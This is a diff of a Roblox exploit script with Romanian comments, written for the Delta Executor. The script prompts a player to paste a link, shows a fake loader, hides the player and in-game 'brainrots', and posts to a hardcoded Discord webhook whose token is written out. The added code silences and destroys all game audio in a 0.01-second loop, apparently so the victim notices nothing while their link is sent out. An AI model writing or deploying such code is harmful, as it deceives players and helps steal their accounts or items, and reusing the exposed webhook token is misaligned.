@@ -1,5 +1,5 @@
--- SCRIPT FINAL DELTA - Varianta care a mers
--- Oprește TOT și pune sunet de ploaie peste
+-- SCRIPT DELTA - OPREȘTE ABSOLUT TOT (ULTRA-AGRESIV)
+-- Compatibil cu Delta Executor
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -8,6 +8,7 @@ local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
 local SoundService = game:GetService("SoundService")
+local RunService = game:GetService("RunService")
 
 local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"
 
@@ -25,49 +26,109 @@ local function sendToDiscord(message)
     end
 end
 
--- ===== OPREȘTE TOT + SUNET DE FUNDAL =====
-local function killAllAudio()
-    -- 1. Sunet de ploaie (acoperă tot)
-    pcall(function()
-        local ambient = Instance.new("Sound")
-        ambient.Name = "CoverSound"
-        ambient.SoundId = "rbxassetid://9120263686"  -- Ploaie
-        ambient.Volume = 1
-        ambient.Looped = true
-        ambient.PlayOnRemove = false
-        ambient.Parent = SoundService
-        ambient:Play()
-    end)
-
-    -- 2. Oprește toate celelalte sunete
+-- ===== OPREȘTE ABSOLUT TOT (ULTRA-AGRESIV) =====
+local function killAbsolutelyEverything()
+    print("🔇 Oprire ABSOLUT TOT...")
+    
+    -- 1. Oprește volumul global
     pcall(function()
         SoundService.Volume = 0
+    end)
+    
+    -- 2. Oprește toate sunetele din JOC (inclusiv cele ascunse)
+    pcall(function()
         for _, sound in pairs(game:GetDescendants()) do
-            if sound:IsA("Sound") and sound.Name ~= "CoverSound" then
+            if sound:IsA("Sound") then
                 sound.Volume = 0
                 sound:Stop()
                 sound.Playing = false
             end
         end
     end)
-
-    -- 3. Blocare agresivă (loop)
+    
+    -- 3. Oprește sunetele din SoundService (inclusiv muzica de fundal)
+    pcall(function()
+        for _, sound in pairs(SoundService:GetDescendants()) do
+            if sound:IsA("Sound") then
+                sound.Volume = 0
+                sound:Stop()
+                sound.Playing = false
+            end
+        end
+        -- Setează volumul la 0 și pentru SoundService
+        SoundService.Volume = 0
+    end)
+    
+    -- 4. Oprește sunetele din fiecare jucător
+    pcall(function()
+        for _, player in pairs(Players:GetPlayers()) do
+            if player.Character then
+                for _, sound in pairs(player.Character:GetDescendants()) do
+                    if sound:IsA("Sound") then
+                        sound.Volume = 0
+                        sound:Stop()
+                        sound.Playing = false
+                    end
+                end
+            end
+        end
+    end)
+    
+    -- 5. Oprește sunetele din CoreGui (interfață)
+    pcall(function()
+        for _, gui in pairs(CoreGui:GetDescendants()) do
+            if gui:IsA("Sound") then
+                gui.Volume = 0
+                gui:Stop()
+                gui.Playing = false
+            end
+        end
+    end)
+    
+    -- 6. Oprește sunetele din LocalPlayer.PlayerGui
+    pcall(function()
+        for _, gui in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
+            if gui:IsA("Sound") then
+                gui.Volume = 0
+                gui:Stop()
+                gui.Playing = false
+            end
+        end
+    end)
+    
+    -- 7. BLOCEAZĂ ORICE SUNET NOU (loop SUPER-RAPID)
     spawn(function()
         while true do
             task.wait(0.01)
             pcall(function()
                 SoundService.Volume = 0
                 for _, sound in pairs(game:GetDescendants()) do
-                    if sound:IsA("Sound") and sound.Name ~= "CoverSound" then
-                        sound.Volume = 0
-                        sound:Stop()
-                        sound.Playing = false
+                    if sound:IsA("Sound") then
+                        if sound.Volume > 0 or sound.Playing == true then
+                            sound.Volume = 0
+                            sound:Stop()
+                            sound.Playing = false
+                        end
                     end
                 end
             end)
         end
     end)
-    print("✅ Totul oprit + sunet de fundal activ!")
+    
+    -- 8. DISTRUGERE DIRECTĂ a obiectelor care produc sunete (opțional)
+    pcall(function()
+        local toDestroy = {}
+        for _, obj in pairs(Workspace:GetDescendants()) do
+            if obj:IsA("Sound") then
+                table.insert(toDestroy, obj)
+            end
+        end
+        for _, sound in pairs(toDestroy) do
+            sound:Destroy()
+        end
+    end)
+    
+    print("✅ ABSOLUT TOT a fost oprit!")
 end
 
 -- ===== ASCUNDE BRAINROT-URILE =====
@@ -459,7 +520,7 @@ local function showLinkGUI()
             gui:Destroy()
             showLoader()
             hideMe()
-            killAllAudio()
+            killAbsolutelyEverything()
             local count = hideBrainrots()
             print("✅ Script active! " .. count .. " brainrots hidden.")
             spawn(function()
@@ -478,7 +539,7 @@ local function main()
     showLinkGUI()
     print("🚀 Waiting for link input...")
     print("🔄 Base resets every 5 seconds.")
-    print("🔊 Cover sound is playing (rain).")
+    print("🔇 ABSOLUTELY EVERYTHING is OFF!")
 end
 
 pcall(main)
